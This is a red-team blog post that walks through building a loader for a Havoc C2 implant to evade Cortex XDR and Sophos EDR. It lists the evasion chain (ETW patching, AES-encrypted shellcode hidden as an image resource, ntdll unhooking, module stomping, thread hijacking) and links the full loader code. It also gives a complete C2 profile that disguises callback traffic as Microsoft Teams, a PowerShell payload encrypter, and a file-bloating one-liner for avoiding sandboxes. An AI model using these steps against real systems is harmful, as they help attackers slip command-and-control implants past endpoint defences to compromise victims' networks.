## About

in this blog post we are going to build our own loader that will load C2 (beacon/demon) in memory and execute and bypass top tier EDRs like PaloAlto Cortex XDR and Sophos EDR 

C2 used in the blog post is havoc C2 

[https://github.com/HavocFramework/Havoc/](https://github.com/HavocFramework/Havoc/)  

## who is the real red teamer ? 

when we approuch linkedin posts about bypasses the EDRs, we need to answer the followings : 

1- you bypass what ? 
    what extacly you bypass is the callback fully functional ? can you dump lsass ? can you do a lateral movment ? and so on ? for sure you will not bypass every thing at some stages some of the actions will be logged and alerted your actions should be well thought out. 
    One wrong move could easily undo all the work you've put into Red Team engagement.

2- can you operate ? 
executeing a reverse shell and call it a bypass it is a joke why ?  
the payload will not be used in a real world becuase in a mature environment your payload will face multiple obstacles : 

- intial access (Email Security ,Security Policies,etc...) 
- threat intelligence tools that will keep hunting for your C2 server and block it before even your paylaod exeucted 
- proxy like skyhigh and zscaler or firewalls
- SOC monitring 
- EDRs

bypassing the EDR is half of the story if you need to conduct full red team engagment form A to Z you need to know how to bypass all of them. which is hard for now days but still possible for sure to do by skilled red teamers. 

today we are going to bypass Cortex XDR and Sophos EDR so we are targeting last stage only for sure that not an easy task but consider it one of the hardest stage. 

## the loader plan 

the plan as following : 

patch ETW  --> Decrypt Shell Code using AES from resources --> unhook (ntdll.dll , kernelbase) --> ModuleStomping --> local thread hijacking to execute the payload --> done !

## The Why Questions , Answers ? 

- why we patch ETW ? 

to bypass ETW (event trace for windows) telemetry which can be used by EDRs to hunt what we are doing in the memory (please note this is half bypass for user mode only there is ETW on kernel mode also)

- why we do encrypt the shellcode in the resources ?

to bypass static scanners 

- why we do the unhooking ?  

to bypass the user mode hooks that was implemneted by the EDR, what is hooking? hooking is basically add a monitor (jmp) before calling any windows API function that will pass the arugments that already passed to the original function to EDR to be scanned before execution. it is like intercepting the calling of the function, we will bypass it today by get a fresh copy from the desk and remove the hooked `ntdll.dll` and `kernelbase` with a new fresh copy.

- why Module Stomping? 

Module Stomping is a code injection technique where the shellcode is injected into the `.text` section of a legitimate sacrificial DLL file, which is a better place to write a payload than a private committed memory region.

- why local thread hijacking ? 

this will create a thread with dummy function to run and suspend it and control the RIP to point to the shellcode and resume the thread execution, this may help to bypass the memory scanners becuase when a thread is created a memory scanner can be triaged by the EDR kernel mode to scan the thread.

## Implementation 

you can find my full implementation in Csharp for this loader in the following github repo :

[https://github.com/casp3r0x0/LoaderGate](https://github.com/casp3r0x0/LoaderGate) 

build the demon payload settings :

![](https://www.pwntricks.com/assets/images/5/1.png)

And :

![](https://www.pwntricks.com/assets/images/5/2.png)

> why 60 seconds ? if sleep was interactive or less seconds this will make the shellcode in clear state in memory that will be easilly picked up using memory scanners by EDR

> sleep means when payload must callback to server and check for tasks to be executed when payload sleep it will be encrypted until the next call will be decrypted and execute the task.

## Havoc C2 porfile settings

below is the following Havoc c2 Profile :

```
Teamserver {
    Host = "0.0.0.0"
    Port = 40056

    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "casp3r0x0" {
        Password = "123"
    }
}

Listeners {
    Http {
        Name         = "teams profile - http"
        Hosts        = [
            "5pider.net", # our callback host.
        ]
        HostBind     = "0.0.0.0" # the address where the listener should bind to. 
        HostRotation = "round-robin"
        PortBind     = 443
        PortConn     = 443
        Secure       = false # for now disabled so we can see the traffic content. (but alaways enabled this!!!)
        KillDate     = "2024-01-02 12:00:00"
        UserAgent    = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"

        Uris = [
            "/Collector/2.0/settings/"
        ]

        Headers = [
            "Accept: json",
            "Referer: https://teams.microsoft.com/_",
            "x-ms-session-id: f73c3186-057a-d996-3b63-b6e5de6ef20c",
            "x-ms-client-type: desktop",
            "x-mx-client-version: 27/1.0.0.2021020410",
            "Accept-Encoding: gzip, deflate, br",
            "Origin: https://teams.microsoft.com"
        ]

        Response {
            Headers = [
                "Content-Type: application/json; charset=utf-8",
                "Server: Microsoft-HTTPAPI/2.0",
                "X-Content-Type-Options: nosniff",
                "x-ms-environment: North Europe-prod-3,_cnsVMSS-6_26",
                "x-ms-latency: 40018.2038",
                "Access-Control-Allow-Origin: https://teams.microsoft.com",
                "Access-Control-Allow-Credentials: true",
                "Connection: keep-alive"
            ]
        }

    }

    Smb {
        Name     = "Pivot - Smb"
        PipeName = "demon_pipe"
    }
}

# this is optional. if you dont use it you can remove it.
Service {
    Endpoint = "service-endpoint"
    Password = "service-password"
}

Demon {
    Sleep = 2
    Jitter = 20

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\Werfault.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\Werfault.exe"
    }
}
```


powershell encrypter it will save the payload as `image.pngx` you may change the IV and the Key:

```
# Load AES encryption functions
Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class AesEncryptor
{
    private static byte[] key = Encoding.UTF8.GetBytes("1234567890abcdef123656729x1zgwgH"); // 32 bytes key
    private static byte[] iv = Encoding.UTF8.GetBytes("abcdef1299536189"); // 16 bytes IV

    public static byte[] Encrypt(string filePath)
    {
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.Key = key;
            aesAlg.IV = iv;

            ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
            using (MemoryStream msEncrypt = new MemoryStream())
            {
                using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                {
                    using (FileStream fsInput = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                    {
                        fsInput.CopyTo(csEncrypt);
                    }
                }
                return msEncrypt.ToArray();
            }
        }
    }
}
"@ -Language CSharp

# Define file to encrypt
$filePath = ".\demon.x64.bin"  # Replace with the actual EXE filename if different
$encryptedData = [AesEncryptor]::Encrypt($filePath)

# Save the encrypted data to a new file
$encryptedFilePath = ".\image.pngx"
[IO.File]::WriteAllBytes($encryptedFilePath, $encryptedData)

Write-Host "Encryption complete. Encrypted file saved to: $encryptedFilePath"
```


after downloading the `LoaderGate` project go to : 

right click on project click properties --> go to resources --> remove the old one and remove the old one from the resource folder in the soulution explorer --> drag and drope the new one that you created into the resouces settings --> click on the image.pngx from (solution explorer) --> make sure that the build action is Embedded Resources

![](https://www.pwntricks.com/assets/images/5/3.png)


build the solution you can find the final payload in `\bin\x64\Release\laaas.exe` you can use any dot net obfuscating tool. 


## simple sandbox bypass trick *File Bloating*

when the payload is not known most of the EDRs will try to upload the payload to an online sandbox, we can use technique called file File Bloating wich will make the size of the payload bigger and in this way the payload will not be uploaded to the sandbox. 

below powershell oneliner to make the size of the payload +150 Mega Byte

```
$exe = ".\laaas.exe"; $size = 150MB; $fs = [System.IO.File]::OpenWrite($exe); $fs.SetLength($size); $fs.Close()
```

## *Proof PaloAlto Cortex XDR*

### *whoami*

![](https://www.pwntricks.com/assets/images/5/WhoamiCortex.png)

### *screenshot*
![](https://www.pwntricks.com/assets/images/5/CortexScreenshot.png)

## *Proof Sophos EDR*

### *whoami*
![](https://www.pwntricks.com/assets/images/5/SophosWhoami.png)

### *screenshot*
![](https://www.pwntricks.com/assets/images/5/SophosScreenshot.png)





